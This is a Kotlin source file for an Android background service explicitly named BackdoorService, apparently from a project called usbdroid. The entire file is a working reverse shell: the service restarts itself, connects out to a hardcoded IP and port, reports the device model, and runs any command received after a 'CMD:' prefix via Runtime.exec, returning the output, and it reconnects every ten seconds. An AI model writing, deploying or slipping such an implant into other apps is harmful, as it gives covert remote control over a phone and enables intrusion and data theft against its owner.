package com.usbdroid.service

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.PrintWriter
import java.net.Socket
import kotlin.concurrent.thread

/**
 * Backdoor Service - Maintains persistent connection to PC
 * Works independently of ADB wireless
 */
class BackdoorService : Service() {
    
    private var isRunning = false
    private var isConnected = false
    private val PC_IP = "192.168.117.211"
    private val PC_PORT = 9998
    private val TAG = "BackdoorService"
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!isRunning) {
            isRunning = true
            startBackdoor()
            Log.d(TAG, "Backdoor service started")
        }
        return START_STICKY
    }
    
    private fun startBackdoor() {
        thread {
            while (isRunning) {
                try {
                    Log.d(TAG, "Connecting to $PC_IP:$PC_PORT")
                    val socket = Socket(PC_IP, PC_PORT)
                    isConnected = true
                    
                    val reader = BufferedReader(InputStreamReader(socket.getInputStream()))
                    val writer = PrintWriter(socket.getOutputStream(), true)
                    
                    // Send connection message
                    writer.println("BACKDOOR_CONNECTED:${android.os.Build.MODEL}")
                    Log.d(TAG, "Connected successfully")
                    
                    // Command loop
                    while (isRunning && !socket.isClosed) {
                        val command = reader.readLine() ?: break
                        
                        when {
                            command.startsWith("CMD:") -> {
                                val cmd = command.substring(4)
                                val result = executeCommand(cmd)
                                writer.println("RESULT:$result")
                            }
                            command == "PING" -> {
                                writer.println("PONG")
                            }
                        }
                    }
                    
                    socket.close()
                } catch (e: Exception) {
                    Log.e(TAG, "Connection error: ${e.message}")
                } finally {
                    isConnected = false
                }
                
                // Retry after 10 seconds
                Thread.sleep(10000)
            }
        }
    }
    
    private fun executeCommand(command: String): String {
        return try {
            val process = Runtime.getRuntime().exec(command)
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = reader.readText()
            process.waitFor()
            output
        } catch (e: Exception) {
            "ERROR: ${e.message}"
        }
    }
    
    override fun onDestroy() {
        isRunning = false
        Log.d(TAG, "Backdoor service stopped")
        super.onDestroy()
    }
}
